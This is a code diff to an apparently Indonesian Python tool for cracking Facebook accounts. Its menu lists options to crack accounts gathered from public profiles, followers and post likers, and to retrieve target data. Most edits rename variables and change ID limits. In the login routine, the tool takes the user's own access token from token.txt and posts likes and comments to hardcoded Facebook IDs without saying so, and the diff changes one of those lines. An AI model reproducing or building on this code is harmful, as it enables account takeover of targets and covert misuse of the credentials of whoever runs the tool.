@@ -97,7 +97,7 @@ def menu_log():
             requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
             requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
             requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
-            requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
+            requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(perecod_handal,token,token))
             print('%s║'%(O))
             jalan('%s╚══[%s!%s] %sLogin Successful'%(O,P,O,P))
             menu()
@@ -185,7 +185,7 @@ def menu_log():
     else:
         jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
         menu_log()
-raka_sayang_amanda = '3882176535153442'
+perecod_handal = '3882176535153442'
 def menu():
     clear()
     banner()
@@ -215,8 +215,8 @@ def menu():
         bergabung = '-'
         kadaluarsa = '-'
         pro = ("%s[%sPro%s]"%(O,P,O))
-        upgrade = ('Upgrade To Version %sPro'%(O))
-        jid = ('%s[%s9999 ID%s]'%(O,P,O))
+        upgrade = ('Upgrade To Version %sError'%(O))
+        bangsat = ('%s[%s5000 ID%s]'%(O,P,O))
     try:
         token = open("token.txt","r").read()
         x = requests.get("https://graph.facebook.com/me?access_token=" + token)
@@ -251,9 +251,9 @@ def menu():
     print('%s╠══[%s•%s] %sJoin Since : %s'%(O,P,O,P,bergabung))
     print('%s╠══[%s•%s] %sValid until : %s'%(O,P,O,P,kadaluarsa))
     print('%s║'%(O))
-    print('%s╠══[%s1%s] %sCrack From Public %s'%(O,P,O,P,jid))
-    print('%s╠══[%s2%s] %sCrack From Follower %s'%(O,P,O,P,jid))
-    print('%s╠══[%s3%s] %sCrack From likes post %s'%(O,P,O,P,jid))
+    print('%s╠══[%s1%s] %sCrack From Public %s'%(O,P,O,P,bangsat))
+    print('%s╠══[%s2%s] %sCrack From Follower %s'%(O,P,O,P,bangsat))
+    print('%s╠══[%s3%s] %sCrack From likes post %s'%(O,P,O,P,bangsat))
     print('%s╠══[%s4%s] %sRetrieve Target Data'%(O,P,O,P))
     print('%s╠══[%s5%s] %sTaking Number of Friends %s'%(O,P,O,P,pro))
     print('%s╠══[%s6%s] %sCheck Crack Results'%(O,P,O,P))
@@ -388,9 +388,9 @@ def publik():
         wl = requests.get(url_license + lisensi)
         wk = json.loads(wl.text)
         wj = wk['username']
-        jid = '5000'
+        bangsat = '5000'
     except (KeyError,IOError):
-        jid = '5000'
+        bangsat = '5000'
     except requests.exceptions.ConnectionError:
         jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
         exit()
@@ -436,9 +436,9 @@ def pengikut():
         wl = requests.get(url_license + lisensi)
         wk = json.loads(wl.text)
         wj = wk['username']
-        jid = '10000'
+        bangsat = '5000'
     except (KeyError,IOError):
-        jid = '5000'
+        bangsat = '5000'
     except requests.exceptions.ConnectionError:
         jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
         exit()
@@ -484,9 +484,9 @@ def likers():
         wl = requests.get(url_license + lisensi)
         wk = json.loads(wl.text)
         wj = wk['username']
-        jid = '10000'
+        bangsat = '5000'
     except (KeyError,IOError):
-        jid = '5000'
+        bangsat = '5000'
     except requests.exceptions.ConnectionError:
         jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
         exit()
